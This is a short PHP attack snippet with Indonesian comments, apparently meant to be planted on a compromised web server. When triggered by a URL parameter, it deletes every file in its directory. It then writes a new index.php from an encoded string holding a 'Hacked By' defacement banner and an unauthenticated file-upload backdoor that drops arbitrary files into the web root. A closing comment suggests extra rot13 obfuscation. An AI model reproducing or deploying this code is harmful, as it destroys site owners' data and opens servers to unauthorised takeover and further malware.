<!--//File Destroy-->  
<!-- Setelah semua terhapus akses index.php?ndelik-->
<?php if (isset($_GET["delete"])) { 
	$files = scandir(__DIR__); 
	foreach ($files as $file) { 
		if (is_file($file)) {  
			unlink($file); }} 
			echo "All Files Deleted and Creating New Index";
			echo " Silahkan akses index.php?ndelik";
			$f = fopen("index.php", "w") or die("Unable to open file!"); 
			fwrite($f, base64_decode('SGFja2VkIEJ5IC4vIE1oQG5rayAtIE1lY2hhbmljYWwgV2Fybgo8P3BocAppZihpc3NldCgkX0dFVFsnbmRlbGlrJ10pKXsKICAgIGVjaG8gIjxmb3JtIG1ldGhvZD0ncG9zdCcgZW5jdHlwZT0nbXVsdGlwYXJ0L2Zvcm0tZGF0YSc+PGlucHV0IHR5cGU9J2ZpbGUnIG5hbWU9J2lkeF9maWxlJz48aW5wdXQgdHlwZT0nc3VibWl0JyBuYW1lPSd1cGxvYWQnIHZhbHVlPSd1cGxvYWQnPjwvZm9ybT4iO30KCiAkcm9vdCA9ICRfU0VSVkVSWydET0NVTUVOVF9ST09UJ107JGZpbGVzID0gQCRfRklMRVNbJ2lkeF9maWxlJ11bJ25hbWUnXTskZGVzdCA9ICRyb290LicvJy4kZmlsZXM7IGlmKGlzc2V0KCRfUE9TVFsndXBsb2FkJ10pKSB7aWYoaXNfd3JpdGFibGUoJHJvb3QpKSB7aWYoQGNvcHkoJF9GSUxFU1snaWR4X2ZpbGUnXVsndG1wX25hbWUnXSwgJGRlc3QpKSB7ICR3ZWIgPSAiaHR0cDovLyIuJF9TRVJWRVJbJ0hUVFBfSE9TVCddLiIvIjtlY2hvICJTdWNjZXNzIHRvIFVwbG9hZCA9PiA8YSBocmVmPSckd2ViLyRmaWxlcycgdGFyZ2V0PSdfYmxhbmsnPjx1PiR3ZWIvJGZpbGVzPC91PjwvYT4iO30gZWxzZSB7ZWNobyAiRmFpbGVkIHRvIHVwbG9hZCBvbiByb290IGRpciI7fX0gZWxzZSB7IGlmKEBjb3B5KCRfRklMRVNbJ2lkeF9maWxlJ11bJ3RtcF9uYW1lJ10sICRmaWxlcykpIHtlY2hvICJTdWNjZXNzIHVwbG9hZCA8Yj4kZmlsZXM8L2I+IGluIHRoaXMgZm9sZGVyIjt9IGVsc2Uge2VjaG8gIkZhaWxlZCBUbyBVcGxvYWQiO319fSA/Pg=='));} ?>

<!--//End File Destroy

buat writer encode str_rot13(base64_decode("")); ke file baru
-->

